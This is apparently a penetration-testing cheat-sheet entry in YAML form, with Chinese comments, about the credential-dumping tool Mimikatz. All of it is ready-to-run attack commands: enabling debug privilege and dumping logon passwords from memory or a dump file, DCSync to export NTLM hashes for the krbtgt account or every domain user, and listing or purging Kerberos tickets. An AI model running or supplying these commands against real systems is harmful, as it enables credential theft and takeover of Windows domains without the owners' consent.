name: mimikatz
tags: [mimikatz,mimi]
data: |

  # 抓取密码：

  privilege::debug
  sekurlsa::logonpasswords

  # 一条命令：
  
  mimikatz.exe "log res.log" "privilege::debug" "sekurlsa::logonPasswords full" exit
  
  mimikatz.exe "log res.log" "sekurlsa::minidump tmp.dmp" "sekurlsa::logonPasswords full" exit

  # 导出NTLM Hash：
  
  lsadump::dcsync /domain:test.com /user:krbtgt
  
  lsadump::dcsync /domain:test.com /all /csv

  # 列出所有票据：
  
  kerberos::list 
  
  # 删除所有票据：
  
  kerberos::purge 
